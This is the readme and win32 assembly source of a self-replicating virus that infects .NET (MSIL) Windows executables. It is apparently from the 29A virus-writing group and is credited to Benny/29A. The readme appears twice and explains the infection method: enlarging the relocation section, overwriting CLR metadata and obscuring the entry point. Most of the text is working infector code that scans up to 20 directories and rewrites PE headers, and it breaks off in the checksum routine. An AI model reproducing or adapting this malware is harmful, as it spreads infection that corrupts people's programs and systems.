
���������������������������������������������������������������[DOTNET.TXT]���
COMMENT &

                           ���������������������������¿
                           ���������������������������Ŵ 
                           ���������������������������Ŵ 
                           ���Ŵ .NET/dotNET virus ���Ŵ 
                           ���Ŵ    by Benny/29A   ���Ŵ
                           ���������������������������Ŵ
                           ���������������������������Ŵ
                           �����������������������������


Hello reader,

lemme introduce you my first Windows virus for .NET CLR architecture!
For next informationz read my article "Microsoft .NET Common Language
Runtime Overview.

.
Everything began when I started to explore the .NET Common Language Runtime
platform, designed by Microsoft. I wrote an article about it and started to
work on one very trivial virus that could show how to use class librariez.
Everything in C#.
The idea was very simple - create sample of prepender written in C#. How easy
it sounded, so hard to code it was. C#, such like Java have VERY STRICT type
checking. And I figured out that there's NO easy way how to work with
stringz - once a string is defined, you CAN'T change it - and I needed to
do that, becoz it was very important for viral functionality.

That sucked. I decided to forget that and go to my favourite techno-pub, talk
with some friendz and get some weed, becoz I hadn't smoked for long time.
Well, one my friend that I hadn't seen for a half a year brought me some very
good skunk....
when I came home, I couldn't sleep, even it was after midnight. I was very
tired, but becoz of that weed, 2 litres of Coke inside my stomach and
unfinished C# virus it was unable for me to fall alseep. Then I saw the
CLEAR light...for a few secondz I watched only that but then I saw whole MSIL PE
structure and there my virus how fits there. It was wonderful idea how to
modify PE structure and CLR header and keep it working, together with virus.
And that time everything began..
For curious ppl I can say that after that I stayed awake for next two and half
of hour :-) Heh, Paul McCartney composed Yesterday song while he was sleeping,
so why shouldn't I get some kewl idea in the bed too? <BP>
.

But now let's talk about more technical thingz - the virus itself. The 95
percentz of whole virus is written in win32 assembler, the rest is in MSIL.
How the virus worx? Virus can work only with some specific MSIL PE filez, mostly
generated by C# compiler. The virus aint complex much, but it shows some very
interesting thingz that can be done in .NET environment.

So, how does it can infect MSIL PE filez?
Virus enlargez the (last) relocation section and copiez its body there. Then
it locatez CLR header, save host's metadata and overwritez them by viral
metadata. The virus also uses EPO (EntryPoint Obscuring) for setting entrypoint
- it overwritez CLR dispatcher by JMP <virus> code and removez CLR descriptor.
After execution such infected file the virus code instead of CLR dispatcher
is called. Virus, after it finishes all needed actionz, repairz CLR descriptor
and executez the file - by this the viral metadata are executed. And in the
3rd stage the virus also repairz CLR descriptor and JMP <dispatcher> so
original (host's) metadata are executed. Easy and effective ;-)


Here follows the algorithm:

<main>
01)	initialization - SEH frame, delta offset, K32 base, API addresses
02)	infect all filez in current directory				*1*
03)	infect so up to 20 directoriez by .. (dotdot) method.
04)	create "drive:\path\hostfile .exe"
05)	correct CLR descriptor field in data directory in PE header
06)	save the file and execute it (viral metadata is activated)	*2*
07)	wait for its termination
08)	restore JMP DWORD PTR [dispatcher_entry] and CLR descriptor
09)	create command line, save the file and execute it (host is activated)
10)	wait for hosts termination and delete temporarz file ("hostfile .exe")
11)	terminate viral process

<*1* - infection stage>
01)	open the file (and enlarge it)
02)	check PE header
03)	erase base relocation record
04)	check CLR header and structure
05)	locate entrypoint and create JMP <virus>
06)	save hosts metadata and copy there viral metadata
07)	correct PE header and calculate new checksum
08)	close file and quit

<*2* - viral metadata>
01)	create new instance of System.Random class
02)	call its constructor - System.Random::.ctor()
02)	get random number (System.Random.Next())
03)	1:10 that virus will show Windows message box - payload


As you can see, my vision wasn't to code some super-spreading virus, but
only to show how it is possible to infect .NET applicationz - changing
PE structure, CLR header structure, implanting viral metadata etc...
The virus also ain't optimized much, becoz I wanted to have the source
readable also for not skilled coderz.

NOTE: if you will try to execute 1st generation code, the system loader
should 2 timez report errorz with loading - virus triez to execute those
2 repaired filez. Becoz there ain't any CLR header inside 1st generation
code, loader won't be able to load it. But for creating copiez of my
virus it ain't serious problem - virus can infect filez and since 2nd
generation it worx properly.
It is possible that virus containz some minor bugz (I have only 1 machine
with .NET architecture), but it shouldn't be anything that would cause
problemz with infection.


Well, I hope you will like my code. If you will have any commentz and/or
suggestionz, feel free to contact me.



		....................................................
		.			Benny / 29A
		.			benny@post.cz
		.			http://benny29a.cjb.net
		.
		... perfectionist, maximalist, idealist, dreamer ...
&
���������������������������������������������������������������[DOTNET.TXT]���
���������������������������������������������������������������[DOTNET.ASM]���
COMMENT &

                           ���������������������������¿
                           ���������������������������Ŵ 
                           ���������������������������Ŵ 
                           ���Ŵ .NET/dotNET virus ���Ŵ 
                           ���Ŵ    by Benny/29A   ���Ŵ
                           ���������������������������Ŵ
                           ���������������������������Ŵ
                           �����������������������������


Hello reader,

lemme introduce you my first Windows virus for .NET CLR architecture!
For next informationz read my article "Microsoft .NET Common Language
Runtime Overview.

.
Everything began when I started to explore the .NET Common Language Runtime
platform, designed by Microsoft. I wrote an article about it and started to
work on one very trivial virus that could show how to use class librariez.
Everything in C#.
The idea was very simple - create sample of prepender written in C#. How easy
it sounded, so hard to code it was. C#, such like Java have VERY STRICT type
checking. And I figured out that there's NO easy way how to work with
stringz - once a string is defined, you CAN'T change it - and I needed to
do that, becoz it was very important for viral functionality.

That sucked. I decided to forget that and go to my favourite techno-pub, talk
with some friendz and get some weed, becoz I hadn't smoked for long time.
Well, one my friend that I hadn't seen for a half a year brought me some very
good skunk....
when I came home, I couldn't sleep, even it was after midnight. I was very
tired, but becoz of that weed, 2 litres of Coke inside my stomach and
unfinished C# virus it was unable for me to fall alseep. Then I saw the
CLEAR light...for a few secondz I watched only that but then I saw whole MSIL PE
structure and there my virus how fits there. It was wonderful idea how to
modify PE structure and CLR header and keep it working, together with virus.
And that time everything began..
For curious ppl I can say that after that I stayed awake for next two and half
of hour :-) Heh, Paul McCartney composed Yesterday song while he was sleeping,
so why shouldn't I get some kewl idea in the bed too? <BP>
.

But now let's talk about more technical thingz - the virus itself. The 95
percentz of whole virus is written in win32 assembler, the rest is in MSIL.
How the virus worx? Virus can work only with some specific MSIL PE filez, mostly
generated by C# compiler. The virus aint complex much, but it shows some very
interesting thingz that can be done in .NET environment.

So, how does it can infect MSIL PE filez?
Virus enlargez the (last) relocation section and copiez its body there. Then
it locatez CLR header, save host's metadata and overwritez them by viral
metadata. The virus also uses EPO (EntryPoint Obscuring) for setting entrypoint
- it overwritez CLR dispatcher by JMP <virus> code and removez CLR descriptor.
After execution such infected file the virus code instead of CLR dispatcher
is called. Virus, after it finishes all needed actionz, repairz CLR descriptor
and executez the file - by this the viral metadata are executed. And in the
3rd stage the virus also repairz CLR descriptor and JMP <dispatcher> so
original (host's) metadata are executed. Easy and effective ;-)


Here follows the algorithm:

<main>
01)	initialization - SEH frame, delta offset, K32 base, API addresses
02)	infect all filez in current directory				*1*
03)	infect so up to 20 directoriez by .. (dotdot) method.
04)	create "drive:\path\hostfile .exe"
05)	correct CLR descriptor field in data directory in PE header
06)	save the file and execute it (viral metadata is activated)	*2*
07)	wait for its termination
08)	restore JMP DWORD PTR [dispatcher_entry] and CLR descriptor
09)	create command line, save the file and execute it (host is activated)
10)	wait for hosts termination and delete temporarz file ("hostfile .exe")
11)	terminate viral process

<*1* - infection stage>
01)	open the file (and enlarge it)
02)	check PE header
03)	erase base relocation record
04)	check CLR header and structure
05)	locate entrypoint and create JMP <virus>
06)	save hosts metadata and copy there viral metadata
07)	correct PE header and calculate new checksum
08)	close file and quit

<*2* - viral metadata>
01)	create new instance of System.Random class
02)	call its constructor - System.Random::.ctor()
02)	get random number (System.Random.Next())
03)	1:10 that virus will show Windows message box - payload


As you can see, my vision wasn't to code some super-spreading virus, but
only to show how it is possible to infect .NET applicationz - changing
PE structure, CLR header structure, implanting viral metadata etc...
The virus also ain't optimized much, becoz I wanted to have the source
readable also for not skilled coderz.

NOTE: if you will try to execute 1st generation code, the system loader
should 2 timez report errorz with loading - virus triez to execute those
2 repaired filez. Becoz there ain't any CLR header inside 1st generation
code, loader won't be able to load it. But for creating copiez of my
virus it ain't serious problem - virus can infect filez and since 2nd
generation it worx properly.
It is possible that virus containz some minor bugz (I have only 1 machine
with .NET architecture), but it shouldn't be anything that would cause
problemz with infection.


Well, I hope you will like my code. If you will have any commentz and/or
suggestionz, feel free to contact me.



		....................................................
		.			Benny / 29A
		.			benny@post.cz
		.			http://benny29a.cjb.net
		.
		... perfectionist, maximalist, idealist, dreamer ...
&


.386p
.model	flat

include	win32api.inc
include	useful.inc
include	mz.inc
include	pe.inc


.data
	db	?				;some data


.code						;code starts here
Start:	pushad
	@SEH_SetupFrame	<jmp	end_host>	;create SEH frame

	call	_gdelta				;get delta offset
gdelta:	db	0B8h
_gdelta:pop	ebp

	call	get_base			;get K32 base address
	call	get_apis			;find addresses of APIz

	call	[ebp + a_GetVersion - gdelta]
	cmp	al,5
	jne	end_host			;must be Win2k+

	lea	eax,[ebp + prev_dir - gdelta]
	push	eax
	push	MAX_PATH
	call	[ebp + a_GetCurrentDirectoryA - gdelta]
						;get current directory
	push	20
	pop	ecx				;20 passes in directory tree
f_infect:
	push	ecx

	;direct action - infect all MSIL PE filez in directory
	lea	esi,[ebp + WFD - gdelta]		;WIN32_FIND_DATA structure
	push	esi					;save its address
	@pushsz	'*.exe'					;search for all filez
	call	[ebp + a_FindFirstFileA - gdelta]	;find first file
	inc	eax
	je	e_find				;quit if not found
	dec	eax
	push	eax				;save search handle to stack

f_next:	call	CheckInfect			;infect found file

	push	esi				;save WFD structure
	push	dword ptr [esp+4]		;and search handle from stack
	call	[ebp + a_FindNextFileA - gdelta];find next file
	test	eax,eax
	jne	f_next				;and infect it

f_close:call	[ebp + a_FindClose - gdelta]	;close search handle

e_find:	@pushsz	'..'
	mov	esi,[ebp + a_SetCurrentDirectoryA - gdelta]
	call	esi				;go upper in directory tree
	pop	ecx
	loop	f_infect			;and again..

	lea	eax,[ebp + prev_dir - gdelta]
	push	eax
	call	esi				;go back to original directory

end_host:
	@SEH_RemoveFrame			;remove SEH frame
	mov	[ebp + _ebp_ - gdelta],ebp	;save old delta offset
	popad

	pushad
	@SEH_SetupFrame	<jmp	quit_host>	;setup new SEH frame
	mov	ebp,12345678h			;get delta offset
_ebp_ = dword ptr $-4

	lea	esi,[ebp + host_name - gdelta]
	push	esi
	push	MAX_PATH
	push	esi
	push	0
	call	[ebp + a_GetModuleFileNameA - gdelta]
						;get filename of host application
	lea	edi,[ebp + new_host_name - gdelta]
	mov	al,'"'
	stosb
	push	edi
	@copysz

	mov	[edi-5],'XE. '
	mov	word ptr [edi-1],'E'		;create "drive:\path\filename .exe"
	pop	edi
	pop	esi

	push	0
	push	edi
	push	esi
	call	[ebp + a_CopyFileA - gdelta]
	dec	eax				;create the file
	jne	quit_host

	call	OpenMapHost
	jc	quit_host			;open the file
	mov	ecx,[edx.MZ_lfanew]
	add	ecx,edx
	mov	word ptr [ecx.NT_OptionalHeader.OH_DataDirectory.DE_IAT.DD_VirtualAddress+10h],2008h
	mov	byte ptr [ecx.NT_OptionalHeader.OH_DataDirectory.DE_IAT.DD_VirtualAddress+14h],48h
						;restore pointer to CLR header and its size
	call	UnmapHost			;close the file
	call	CallHost			;and execute it

	call	OpenMapHost			;open the file
	jc	quit_host
	pushad
	mov	ecx,[edx.MZ_lfanew]
	add	ecx,edx
	movzx	eax,word ptr [ecx.NT_FileHeader.FH_SizeOfOptionalHeader]
	push	ecx
	lea	ecx,[eax+ecx+IMAGE_SIZEOF_FILE_HEADER+4]
	mov	edi,[ecx.SH_PointerToRawData]
	add	edi,edx
	mov	ebx,edi
	add	edi,8

	mov	edx,ecx
	pop	ecx
	push	edi
	mov	edi,[ecx.NT_OptionalHeader.OH_AddressOfEntryPoint]
	sub	edi,[edx.SH_VirtualAddress]
	add	edi,ebx
	mov	ax,25FFh			;create JMP DWORD PTR [entrypoint*]
	stosw
	mov	eax,12345678h
stored_entrypoint = dword ptr $-4
	stosd
	pop	edi

	mov	esi,400000h
	mov	edx,[esi.MZ_lfanew]
	add	edx,esi
	movzx	eax,word ptr [edx.NT_FileHeader.FH_NumberOfSections]
	dec	eax
	imul	eax,eax,IMAGE_SIZEOF_SECTION_HEADER
	movzx	esi,word ptr [edx.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	esi,[eax+esi+IMAGE_SIZEOF_FILE_HEADER+4]
	add	esi,edx
	mov	esi,[esi.SH_VirtualAddress]
	add	esi,stored_meta_code-Start+400000h

	mov	ecx,meta_end-meta_code
	rep	movsb				;copy old CLR header

	;now we have to build up the command line

	lea	esi,[ebp + new_host_name+1 - gdelta]
	@endsz
	dec	esi
	mov	edi,esi
	mov	al,'"'
	stosb
	call	[ebp + a_GetCommandLineA - gdelta]
	xchg	eax,esi
	call	check_comm
	jc	@sp
@cc:	call	check_comm
	jc	@cc
	jmp	@ec
@sp:	cmp	al,' '
	jne	get_to_space
	jmp	@ec
get_to_space:
	lodsb
	cmp	al,' '
	jne	get_to_space
	jmp	@ec
check_comm:
	lodsb
	cmp	al,'"'
	clc
	je	end_comm
	stc
end_comm:
	ret
@ec:	mov	al,' '
	stosb
	@copysz
	popad

	call	UnmapHost			;close the file
	call	CallHost			;and execute it

	lea	esi,[ebp + new_host_name+1 - gdelta]
	push	esi
@fa:	lodsb
	cmp	al,'"'
	jne	@fa
	mov	byte ptr [esi-1],0
	call	[ebp + a_DeleteFileA - gdelta]
						;delete the temporary file
quit_host:
	@SEH_RemoveFrame			;remove SEH frame
	popad
	ret					;and quit!

;this procedure executez host file

CallHost:
	lea	eax,[ebp + lpProcInfo - gdelta]
	push	eax
	lea	eax,[ebp + lpStartupInfo - gdelta]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	lea	eax,[ebp + new_host_name - gdelta]
	push	eax
	push	0
	call	[ebp + a_CreateProcessA - gdelta]
	test	eax,eax				;execute the file
	je	e_omh
	push	-1
	push	dword ptr [ebp + lpProcInfo - gdelta]
	call	[ebp + a_WaitForSingleObject - gdelta]	;wait for its termination
	push	dword ptr [ebp + lpProcInfo - gdelta]	;close all opened handlez
	push	dword ptr [ebp + lpProcInfo+4 - gdelta]
	call	[ebp + a_CloseHandle - gdelta]
	call	[ebp + a_CloseHandle - gdelta]
e_omh:	stc
	ret

;this procedure openz and mapz host file

OpenMapHost:
	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	GENERIC_READ or GENERIC_WRITE
	push	edi
	call	[ebp + a_CreateFileA - gdelta]
	inc	eax				;open the file
	je	e_omh
	dec	eax
	cdq
	xchg	eax,esi				;handle to ESI

	push	edx
	push	edx
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	esi
	call	[ebp + a_CreateFileMappingA - gdelta]
	cdq					;create file mapping object
	xchg	eax,ebx				;handle to EBX
	test	ebx,ebx
	je	UnmapHost1

	push	edx
	push	edx
	push	edx
	push	FILE_MAP_WRITE
	push	ebx
	call	[ebp + a_MapViewOfFile - gdelta]
	xchg	eax,edx				;map the file, ptr to EDX
	test	edx,edx
	je	UnmapHost2
	clc
	ret

;this procedure unmapz and closez the host file

UnmapHost:
	push	edx
	call	[ebp + a_UnmapViewOfFile - gdelta]
UnmapHost2:
	push	ebx
	call	[ebp + a_CloseHandle - gdelta]
UnmapHost1:
	push	esi
	call	[ebp + a_CloseHandle - gdelta]
	stc
	ret


;this procedure can retrieve base address of K32
get_base	Proc
	push	ebp			;store EBP
	call	gdlt			;get delta offset
gdlt:	pop	ebp			;to EBP

	mov	eax,12345678h		;get lastly used address
last_kern = dword ptr $-4
	call	check_kern		;is this address valid?
	jecxz	end_gb			;yeah, we got the address

	call	gb_table		;jump over the address table
	dd	077E00000h		;NT/W2k
	dd	077E80000h		;NT/W2k
	dd	077ED0000h		;NT/W2k
	dd	077F00000h		;NT/W2k
	dd	0BFF70000h		;95/98
gb_table:
	pop	edi			;get pointer to address table
	push	4			;get number of items in the table
	pop	esi			;to ESI
gbloop:	mov	eax,[edi+esi*4]		;get item
	call	check_kern		;is address valid?
	jecxz	end_gb			;yeah, we got the valid address
	dec	esi			;decrement ESI
	test	esi,esi			;end of table?
	jne	gbloop			;nope, try next item

	call	scan_kern		;scan the address space for K32
end_gb:	pop	ebp			;restore EBP
	ret				;quit

check_kern:				;check if K32 address is valid
	mov	ecx,eax			;make ECX != 0
	pushad				;store all registers
	@SEH_SetupFrame	<jmp	end_ck>	;setup SEH frame
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	end_ck			;nope
	mov 	ebx,[eax.MZ_lfanew]	;get pointer to PE header
	add	ebx,eax			;normalize it
	mov	ebx,[ebx]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	end_ck			;nope
	xor	ecx,ecx			;we got K32 base address
	mov	[ebp + last_kern - gdlt],eax	;save K32 base address
end_ck:	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_ecx],ecx	;save ECX
	popad				;restore all registers
	ret				;if ECX == 0, address was found

SEH_hndlr macro				;macro for SEH
        @SEH_RemoveFrame		;remove SEH frame
	popad				;restore all registers
        add	dword ptr [ebp + bAddr - gdlt],1000h	;explore next page
        jmp	bck			;continue execution
endm

scan_kern:				;scan address space for K32
bck:    pushad				;store all registers
	@SEH_SetupFrame	<SEH_hndlr>	;setup SEH frame
	mov	eax,077000000h		;starting/last address
bAddr = dword ptr $-4
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	pg_flt			;nope
	mov 	edi,[eax.MZ_lfanew]	;get pointer to PE header
	add	edi,eax			;normalize it
	mov	ebx,[edi]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	pg_flt			;nope
	mov	ebx,eax
	mov	esi,eax
	add	ebx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add	esi,[ebx.ED_Name]
	mov	esi,[esi]
	add	esi,-'NREK'
	je	end_sk
pg_flt:	xor	ecx,ecx			;we got K32 base address
	mov	[ecx],esi		;generate PAGE FAULT! search again...
end_sk:	mov	[ebp + last_kern - gdlt],eax	;save K32 base address
	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_eax],eax	;save EAX - K32 base
	popad				;restore all registers
	ret
get_base	EndP


;this procedure can retrieve API addresses
get_apis	Proc
	pushad
	@SEH_SetupFrame	<jmp q_gpa>
	lea	esi,[ebp + crc32s - gdelta]	;get ptr to CRC32 values of APIs
	lea	edi,[ebp + a_apis - gdelta]	;where to store API addresses
	push	crc32c    		;how many APIs do we need
	pop	ecx			;in ECX...
g_apis:	push	eax			;save K32 base
	call	get_api
	stosd				;save address
	test	eax,eax
	pop	eax
	je	q_gpa			;quit if not found
	add	esi,4			;move to next CRC32 value
	loop	g_apis			;search for API addresses in a loop
end_seh:@SEH_RemoveFrame		;remove SEH frame
	popad				;restore all registers
	ret				;and quit from procedure
q_gpa:	@SEH_RemoveFrame
	popad
	pop	eax
	jmp	end_host		;quit if error
get_apis	EndP


;this procedure can retrieve address of given API
get_api		Proc
	pushad				;store all registers
	@SEH_SetupFrame	<jmp	end_gpa>;setup SEH frame
	mov	edi,[eax.MZ_lfanew]	;move to PE header
	add	edi,eax			;...
	mov	ecx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
	jecxz	end_gpa			;quit if no exports
	mov	ebx,eax
	add	ebx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	mov	edx,eax			;get address of export table
	add	edx,[ebx.ED_AddressOfNames]	;address of API names
	mov	ecx,[ebx.ED_NumberOfNames]	;number of API names
	mov	edi,edx
	push	dword ptr [esi]		;save CRC32 to stack
	mov	ebp,eax
	xor	eax,eax
APIname:push	eax
	mov	esi,ebp			;get base
	add	esi,[edx+eax*4]		;move to API name
	push	esi			;save address
	@endsz				;go to the end of string
	sub	esi,[esp]		;get string size
	mov	edi,esi			;move it to EDI
	pop	esi			;restore address of API name
	call	CRC32			;calculate CRC32 of API name
	cmp	eax,[esp+4]		;is it right API?
	pop	eax
	je	g_name			;yeah, we got it
	inc	eax                     ;increment counter
	loop	APIname			;and search for next API name
	pop	eax
end_gpa:xor	eax, eax		;set flag
ok_gpa:	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_eax],eax	;save value to stack
	popad				;restore all registers
        ret				;quit from procedure
g_name:	pop	edx
	mov	edx,ebp
	add	edx,[ebx.ED_AddressOfOrdinals]
	movzx	eax,word ptr [edx+eax*2]
	cmp	eax,[ebx.ED_NumberOfFunctions]
	jae	end_gpa-1
	mov	edx,ebp			;base of K32
	add	edx,[ebx.ED_AddressOfFunctions]	;address of API functions
	add	ebp,[edx+eax*4]		;get API function address
	xchg	eax,ebp			;we got address of API in EAX
	jmp	ok_gpa			;quit
get_api		EndP


CRC32:	push	ecx			;procedure for calculating CRC32s
	push	edx			;at run-time
	push	ebx       
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret

;this procedure openz file for infection

OpenMapFile	Proc
	pushad
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	esi
	call	[ebp + a_CreateFileA - gdelta]
	inc	eax			;open the file
	je	end_omf
	dec	eax
	mov	[ebp + hFile - gdelta],eax

	mov	ebx,[ebp + WFD.WFD_nFileSizeLow - gdelta]
	add	ebx,((virus_end-Start+4095)/4096)*4096
	mov	[ebp + mapped_file_size - gdelta],ebx

	cdq
	push	edx
	push	ebx
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	eax
	call	[ebp + a_CreateFileMappingA - gdelta]
	cdq
	xchg	eax,ecx
	jecxz	end_cfma
	mov	[ebp + hMapFile - gdelta],ecx

	push	ebx
	push	edx
	push	edx
	push	FILE_MAP_WRITE
	push	ecx
	call	[ebp + a_MapViewOfFile - gdelta]
	xchg	eax,ecx			;map the file
	jecxz	end_mvof
	mov	[ebp + lpFile - gdelta],ecx
	popad
	clc				;everything ok, clear the CF
	ret
OpenMapFile	EndP


;this procedure closez file for infection

UnmapCloseFile	Proc
	pushad

	push	12345678h
lpFile = dword ptr $-4					;unmap file
	call	[ebp + a_UnmapViewOfFile - gdelta]
end_mvof:
	push	12345678h
hMapFile = dword ptr $-4
	call	[ebp + a_CloseHandle - gdelta]

end_cfma:
	mov	ecx,12345678h		;infection succeeded?
cut_or_not = dword ptr $-4
	jecxz	no_cut			;yeah, dont truncate file
	push	0			;no, truncate file back
	push	0
	push	dword ptr [ebp + WFD.WFD_nFileSizeLow - gdelta]
	push	dword ptr [ebp + hFile - gdelta]
	call	[ebp + a_SetFilePointer - gdelta]
	push	dword ptr [ebp + hFile - gdelta]
	call	[ebp + a_SetEndOfFile - gdelta]

no_cut:	push	12345678h
hFile = dword ptr $-4
	call	[ebp + a_CloseHandle - gdelta]	;close file
end_omf:popad
	stc
	ret
UnmapCloseFile	EndP


;this procedure can check and infect given file

CheckInfect	Proc
	pushad
	@SEH_SetupFrame	<jmp	end_seh>	;setup SEH frame

	mov	[ebp + cut_or_not - gdelta],ebp

	test	[esi.WFD_dwFileAttributes],FILE_ATTRIBUTE_DIRECTORY
	jne	end_seh				;discard directory entries
	xor	ecx,ecx
	cmp	[esi.WFD_nFileSizeHigh],ecx
	jne	end_seh				;discard files >4GB
	mov	eax,[esi.WFD_nFileSizeLow]
	cmp	eax,2048
	jb	end_seh				;discard small filez

	push	eax
	lea	esi,[esi.WFD_szFileName]
	call	OpenMapFile			;open and map the file
	pop	eax
	jc	end_seh

	mov	ecx,[ebp + lpFile - gdelta]
	mov	esi,[ecx.MZ_lfanew]
	cmp	eax,esi				;check signaturez
	jb	ci_close
	add	esi,ecx
	mov	eax,[esi]
	add	eax,-IMAGE_NT_SIGNATURE
	jne	ci_close

	;check internal structure

	cmp	word ptr [esi.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
	jne	ci_close
	mov	ax,[esi.NT_FileHeader.FH_Characteristics]
	test	ax,IMAGE_FILE_EXECUTABLE_IMAGE
	je	ci_close
	test	ax,IMAGE_FILE_DLL
	jne	ci_close
	test	ax,IMAGE_FILE_SYSTEM
	jne	ci_close
	mov	al,byte ptr [esi.NT_FileHeader.OH_Subsystem]
	test	al,IMAGE_SUBSYSTEM_NATIVE
	jne	ci_close

	movzx	eax,word ptr [esi.NT_FileHeader.FH_NumberOfSections]
	dec	eax
	je	ci_close
	imul	eax,eax,IMAGE_SIZEOF_SECTION_HEADER
	mov	ecx,eax
	movzx	edx,word ptr [esi.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	edi,[eax+edx+IMAGE_SIZEOF_FILE_HEADER+4]
	add	edi,esi
	lea	edx,[esi.NT_OptionalHeader.OH_DataDirectory.DE_BaseReloc.DD_VirtualAddress]
	mov	eax,[edx]
	test	eax,eax
	je	ci_close			;quit if no relocs

	mov	ebx,[edi.SH_VirtualAddress]	
	cmp	eax,ebx
	jne	ci_close
	pushad
	xor	eax,eax
	mov	edi,edx
	stosd					;erase relocs record
	stosd
	popad

	;now check the CLR header

	mov	[ebp + relocs_address - gdelta],ebx
	mov	edx,edi
	sub	edx,ecx
	cmp	[edx.SH_VirtualAddress],2000h
	jne	ci_close
	mov	edx,[edx.SH_PointerToRawData]
	add	edx,[ebp + lpFile - gdelta]
	cmp	[esi.NT_OptionalHeader.OH_ImageBase],400000h
	jne	ci_close
	cmp	[esi.NT_OptionalHeader.OH_DataDirectory.DE_IAT.DD_VirtualAddress],2000h
	jne	ci_close			;IAT must be in code section
	mov	ebx,[esi.NT_OptionalHeader.OH_DataDirectory.DE_IAT.DD_VirtualAddress+10h]
	cmp	ebx,2008h			;CLR address must be 2008
	jne	ci_close
	and	dword ptr [esi.NT_OptionalHeader.OH_DataDirectory.DE_IAT.DD_VirtualAddress+10h],0
	and	dword ptr [esi.NT_OptionalHeader.OH_DataDirectory.DE_IAT.DD_VirtualAddress+14h],0
	sub	ebx,2000h			;clear CLR item
	add	ebx,edx

	cmp	dword ptr [ebx],48h		;size of CLR header
	jne	ci_close
	mov	ecx,[ebx+0Ch]
	mov	ebx,[ebx+8]
	cmp	ecx,ebx
	je	ci_close
	sub	ebx,2000h
	add	ebx,edx
	cmp	[ebx],"BJSB"			;metadata signature
	jne	ci_close
	mov	ebx,meta_end-meta_code
	cmp	ecx,ebx
	jb	ci_close			;is there a place for our metadata?

	and	dword ptr [ebp + cut_or_not - gdelta],0

	push	dword ptr [ebp + stored_entrypoint - gdelta]
	pushad
	mov	ebx,[esi.NT_OptionalHeader.OH_AddressOfEntryPoint]
	push	ebx
	sub	ebx,2000h
	add	ebx,edx
	mov	ecx,[ebx+2]
	mov	[ebp + stored_entrypoint - gdelta],ecx
	pop	eax
	sub	eax,12345678h
relocs_address = dword ptr $-4
	add	eax,5
	neg	eax
	mov	byte ptr [ebx],0E9h		;rewrite JMP DWORD PTR [entrypoint]
	mov	[ebx+1],eax			;to JMP LARGE virus_entry
	popad

	pushad
	push	8h
	pop	esi
	add	esi,edx
	mov	ecx,ebx
	lea	edi,[ebp + stored_meta_code - gdelta]
	push	esi
	rep	movsb				;save hosts metadata record
	pop	edi
	mov	ecx,ebx
	lea	esi,[ebp + meta_code - gdelta]
	rep	movsb				;copy there our metadata record
	popad

	mov	eax,virtual_end-Start		;align SH_VirtualSize
	cmp	eax,[edi.SH_VirtualSize]
	jb	o_vs
	mov	ecx,[esi.NT_OptionalHeader.OH_SectionAlignment]
	cdq
	div	ecx
	test	edx,edx
	je	o_val
	inc	eax
o_val:	mul	ecx
	mov	[edi.SH_VirtualSize],eax
o_vs:	mov	eax,((virus_end-Start+4095)/4096)*4096
	cmp	eax,[edi.SH_SizeOfRawData]	;align SH_SizeOfRawData
	jb	o_rs
	mov	ecx,[esi.NT_OptionalHeader.OH_FileAlignment]
	cdq
	div	ecx
	test	edx,edx
	je	o_ral
	inc	eax
o_ral:	mul	ecx
	mov	[edi.SH_SizeOfRawData],eax
o_rs:	pushad
	mov	edi,[edi.SH_PointerToRawData]
	add	edi,[ebp + lpFile - gdelta]
	lea	esi,[ebp + Start - gdelta]
	mov	ecx,virus_end-Start
	rep	movsb				;overwrite relocs by virus body
	popad
	or	dword ptr [edi.SH_Characteristics],IMAGE_SCN_MEM_WRITE
						;set WRITE flag to header
	pop	dword ptr [ebp + stored_entrypoint - gdelta]
						;restore the variable
	call	CalcCheckSum			;correct the checksum of infected file
ci_close:
	call	UnmapCloseFile			;unmap and close the file
	jmp	end_seh				;and quit
CheckInfect	EndP


;this procedure can calculate new checksum for infected file

CalcCheckSum	Proc
	xor	eax,eax
	lea	ebx,[esi.NT_OptionalHeader.OH_CheckSum]
	cmp	[ebx],eax
	je	q_ucf
	@pushsz	'ImageHlp'
	call	[ebp + a_LoadLibraryA - gdelta]
	test	eax,eax			;load imagehlp.dll
	je	q_ucf
	xchg	eax,esi

	@pushsz	'CheckSumMappedFile'
	push	esi
	call	[ebp + a_GetProcAddress - gdelta]
	test	eax,eax			;get address of CheckSumMappedFile API
	je	un_csum			;quit if error

	push	ebx			;where to store new checksum
	call	$+9
	dd	?			;old checksum
	push	12345678h
mapped_file_size = dword ptr $-4
	push	dword ptr [ebp + lpFile - gdelta]
	call	eax			;calculate new checksum

